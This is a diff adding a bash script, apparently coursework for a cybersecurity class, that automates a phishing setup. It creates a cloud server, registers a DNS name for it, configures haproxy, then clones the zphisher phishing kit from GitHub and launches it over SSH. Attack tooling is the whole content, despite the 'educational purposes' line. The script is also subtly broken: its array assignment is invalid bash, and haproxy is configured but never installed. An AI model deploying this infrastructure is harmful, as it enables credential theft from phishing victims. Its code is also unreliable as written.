@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# April 2024, created by Robin Tauxe
+# for CAS Cybersecurity
+# everything made on this script are made for educational purposes
+
+echo "Welcome on this automated script to perform a complete phishing attack quickly"
+
+# Définition du nom à l'aide de la fonction RANDOM
+
+randomstring=$(printf '%s' $(echo "$RANDOM" | md5sum) | cut -c 1-10)
+defname="cas-cyber-""$randomstring"
+
+echo -e "The finale server name will be : $defname"
+
+# Création du serveur 
+
+echo -e "Server creation has been requested. Please wait 2 minutes"
+openstack server create --image "Ubuntu 22.04 LTS Jammy Jellyfish" --flavor a2-ram4-disk20-perf1 --key-name rt-rsa --network ext-net1 $defname --wait
+## !! OUVERTURE FW A PREVOIR !! ##
+
+# Récupération de l'adresse IP
+
+ipadd=$(openstack server show $defname -f json | jq -r '.addresses'| grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b")
+sleep 15
+
+## Création d'un record de type A sur l'IP du serveur pour le nom généré
+
+openstack recordset create --type A --record $ipadd cloud.rt-cas-cyber.ch. $defname
+
+## Configuration de la machine fraichement créée
+
+scp /home/rt/openstack/haproxy.cfg ubuntu@$ipadd:/etc/haproxy/haproxy.cfg
+
+commands = (
+	"git clone --depth=1 https://github.com/htr-tech/zphisher.git"
+	)
+
+# Boucle sur la liste des commandes et exécution via
+for command in "${commands[@]}"; do
+	ssh ubuntu@$ipadd -o StrictHostKeyChecking=no "$command"
+done
+
+sleep 5
+
+# Copie du fichier de configuration haproxy sur la machine distante et activation du service
+
+scp /home/rt/openstack/haproxy.cfg ubuntu@$ipadd:/etc/haproxy/haproxy.cfg
+ssh ubuntu@$ipadd -o StrictHostKeyChecking=no "systemctl enable haproxy && systemctl start haproxy"
+
+## Connexion à la machine et execution du phishing
+
+ssh ubuntu@$ipadd -o StrictHostKeyChecking=no "cd /home/ubuntu/zphisher && bash zphisher.sh"
